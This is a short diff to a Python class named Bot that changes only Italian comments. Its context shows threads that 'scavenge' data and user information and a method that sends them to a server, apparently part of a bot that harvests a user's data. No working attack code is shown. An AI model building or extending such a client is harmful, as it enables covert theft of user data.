@@ -28,6 +28,7 @@ class Bot:
         # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
         self.thread_data = threading.Thread(target=self.dataScavange)
 
+        # Thread incaricato del recupero dei dati dell'utente.
         self.thread_user = threading.Thread(target=self.userScavenge)
 
         # Thread incaricato dell'effettiva comunicazione con il server.
@@ -61,7 +62,7 @@ class Bot:
         while self.thread_user.is_alive():
             sleep(2)
 
-        # manda dati user
+        # manda dati dell'utente
         self.sendToServer()
 
         # Il Bot attende la fine del thread file system prima di mandare i dati.
